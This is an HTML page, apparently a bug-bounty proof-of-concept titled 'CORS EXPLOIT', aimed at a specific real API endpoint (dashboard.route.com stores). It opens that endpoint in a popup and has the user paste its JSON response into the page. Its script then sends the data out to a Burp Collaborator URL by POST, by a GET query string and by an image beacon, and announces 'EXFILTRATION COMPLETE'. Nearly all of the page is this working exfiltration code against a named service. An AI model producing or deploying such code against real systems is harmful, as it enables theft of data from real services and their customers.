<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Auto Capture</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            max-width: 700px;
            margin: 50px auto;
            padding: 30px;
            background: #000;
            color: #0f0;
            border: 3px solid #0f0;
        }
        h1 {
            color: #0f0;
            text-align: center;
            font-size: 32px;
            text-shadow: 0 0 10px #0f0;
        }
        .version {
            text-align: center;
            color: #ff0;
            font-size: 18px;
            margin: 20px 0;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0;
        }
        .box {
            background: #111;
            padding: 25px;
            border: 2px solid #0f0;
            margin: 30px 0;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        label {
            display: block;
            margin-bottom: 10px;
            color: #0f0;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 15px;
        }
        button {
            width: 100%;
            padding: 20px;
            margin-top: 20px;
            background: #0f0;
            color: #000;
            border: none;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        button:hover {
            background: #0c0;
            box-shadow: 0 0 30px #0f0;
        }
        textarea {
            width: 100%;
            height: 200px;
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 10px;
            margin-top: 10px;
        }
        .step {
            background: #1a1a00;
            border-left: 4px solid #ff0;
            padding: 15px;
            margin: 15px 0;
            color: #ff0;
        }
    </style>
</head>
<body>
    <h1>‚ö° CORS EXPLOIT ‚ö°</h1>
    <div class="version">[ AUTO-CAPTURE VERSION ]</div>
    
    <div class="box">
        <label>‚ñ∫ COLLABORATOR URL</label>
        <input type="text" id="collab" placeholder="https://YOUR-ID.burpcollaborator.net">
        
        <button onclick="step1()">STEP 1: OPEN API ENDPOINT</button>
    </div>

    <div class="box" id="step2-box" style="display:none;">
        <div class="step">
            In the popup that opened:<br>
            1. Press <strong>Ctrl+A</strong> (select all)<br>
            2. Press <strong>Ctrl+C</strong> (copy)<br>
            3. Click in the box below<br>
            4. Press <strong>Ctrl+V</strong> (paste)
        </div>
        <label>‚ñ∫ PASTE API DATA HERE</label>
        <textarea id="databox" placeholder="Paste here..."></textarea>
        <button onclick="step2()">STEP 2: PROCESS & ATTACK</button>
    </div>

    <script>
        var collabURL = '';
        var apiWindow = null;

        function step1() {
            collabURL = document.getElementById('collab').value.trim();
            
            if (!collabURL || !collabURL.startsWith('http')) {
                alert('‚ö†Ô∏è Please enter a valid collaborator URL!');
                return;
            }

            // Open API window
            apiWindow = window.open(
                'https://dashboard.route.com/api/mn/v1/stores',
                'api',
                'width=1000,height=700'
            );

            if (!apiWindow) {
                alert('‚ö†Ô∏è Popup blocked! Allow popups and try again.');
                return;
            }

            // Show step 2
            document.getElementById('step2-box').style.display = 'block';
            document.getElementById('step2-box').scrollIntoView({behavior: 'smooth'});

            // Auto-focus on textarea after small delay
            setTimeout(() => {
                document.getElementById('databox').focus();
            }, 2000);
        }

        function step2() {
            var data = document.getElementById('databox').value.trim();

            if (!data || data.length < 10) {
                alert('‚ö†Ô∏è Please paste the API data first!');
                return;
            }

            // Validate JSON
            try {
                JSON.parse(data);
            } catch(e) {
                alert('‚ö†Ô∏è Invalid JSON! Make sure you copied ALL the text.');
                return;
            }

            // Close API window if still open
            if (apiWindow && !apiWindow.closed) {
                apiWindow.close();
            }

            // ALERT 1: Show captured data
            alert('üéØ DATA CAPTURED!\n\n' +
                  '‚úÖ Successfully captured from API endpoint\n\n' +
                  'üìä Size: ' + data.length + ' bytes\n\n' +
                  '‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n' +
                  'DATA PREVIEW:\n' +
                  '‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n\n' +
                  data.substring(0, 600) + '\n\n[...truncated...]');

            // Exfiltrate
            exfiltrate(data);
        }

        function exfiltrate(data) {
            console.log('[+] Exfiltrating', data.length, 'bytes to:', collabURL);

            // POST full data
            fetch(collabURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: data
            }).then(() => console.log('[+] POST sent'));

            // GET with preview
            fetch(collabURL + '?data=' + encodeURIComponent(data.substring(0, 2000)), {
                mode: 'no-cors'
            }).then(() => console.log('[+] GET sent'));

            // Image beacon
            new Image().src = collabURL + '/img?size=' + data.length;

            // ALERT 2: Confirm
            setTimeout(() => {
                alert('‚úÖ EXFILTRATION COMPLETE!\n\n' +
                      'üì° Sent to: ' + collabURL + '\n\n' +
                      'üîç Check your Burp Collaborator for:\n' +
                      '  ‚Ä¢ POST request (full JSON)\n' +
                      '  ‚Ä¢ GET request (preview)\n' +
                      '  ‚Ä¢ Image beacon\n\n' +
                      '‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n' +
                      'ATTACK COMPLETE!\n\n' +
                      'Exfiltrated: ' + data.length + ' bytes');

                // Clear
                document.getElementById('databox').value = '';
                document.getElementById('step2-box').style.display = 'none';
            }, 1000);
        }
    </script>
</body>
</html>
